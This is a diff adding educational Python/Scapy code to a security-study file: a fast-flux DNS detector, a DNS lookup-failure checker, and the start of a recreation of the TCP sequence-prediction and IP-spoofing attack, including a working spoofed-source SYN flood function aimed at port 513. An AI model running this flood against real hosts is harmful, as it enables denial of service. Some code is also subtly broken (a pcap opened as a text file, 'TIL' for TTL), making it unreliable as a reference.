@@ -1450,3 +1450,76 @@ def check_received_ttl_versus_actual(ipsrc, ttl):
 # Linux by default has a TIL of 64 and windows has one of 128, which is why a TIL of 13
 # draws red flags. By now, nmap has probably fixed this error in decoy network scans, which
 # is why it important to understand where vulnerabilities lie in systems and tools.
+
+# The fast-flux technique used by the infamous storm botnet. DNS translates domain names
+# to IP addresses (DNS servers also output a TIL value until which the IP address remains
+# valid for). The attackers swapped IP addresses frequently and made sure there was a low
+# TIL value for validity at a glance. The conflicker attack created 50000 domain names every
+# 3 hours or so and used only a handful for the attacks (aptly named fast-flux for this
+# reason). Let's write a fast-flux detector.
+
+# In Scapy, a DNSQR contains qname, qtype, and qclass questions. The function works by adding
+# IP addresses to a dictionary, peeling a layer, and checking if the next IP exists; the process
+# is repeated until we find a number of unique IP addresses for the same domain.
+
+
+dns_record = {}
+
+
+def handle_packet(packet):
+    if packet.haslayer(DNSRR):
+        rrname = packet.getlayer(DNSRR).rrname
+        rdata = packet.getlayer(DNSRR).rdata
+
+        if rrname in dns_record:
+            if rdata not in dns_record[rrname]:
+                dns_record[rrname].append(rdata)
+        else:
+            dns_record[rrname] = []
+            dns_record[rrname].append(rdata)
+
+
+def check_domain_ips():
+    pkts = open('fastFlux.pcap')
+    for pkt in pkts:
+        handle_packet(pkt)
+
+    for item in dns_record:
+        print("[+] {} has {} unique IPs".format(item, str(len(dns_record[item]))))
+
+# Most DNS servers lacked the ability to translate domain names to actual addresses, so
+# they generated error codes instead. Let's check errors for these failures.
+
+
+def dns_error_check(packet):
+    # Port 53 contains resource records. if rcode equals 3, that is an
+    # error
+    if packet.haslayer(DNSRR) and packet.getlayer(UDP).sport == 53:
+        rcode = packet.getlayer(DNS).rcode
+        qname = packet.getlayer(DNSQR).qname
+
+        if rcode == 3:
+            print("[!] Name request lookup failed: {}".format(qname))
+            return True
+        else:
+            return False
+
+# Recreating the TCP sequence prediction + IP spoofing vector
+# The attack went like this:
+# 1. find a server that the machine trusts
+# 2. silence that server
+# 3. spoof a connection from that server
+# 4. spoof an acknowledgement of the TCP three-way handshake
+#
+# All this sounds more complicated than it really is. As always, the
+# toughest part is the theory and creativity in the attacks: the code
+# is easy! The silcening was done by a SYN flood, which keeps the server
+# from responding.
+
+
+def syn_flood(src, tgt):
+    for sport in range(1024, 65535):
+        IPlayer = IP(src=src, dst=tgt)
+        TCPlayer = TCP(sport=sport, dport=513)
+        pkt = IPlayer / TCPlayer
+        scapy.sendrecv.send(pkt)
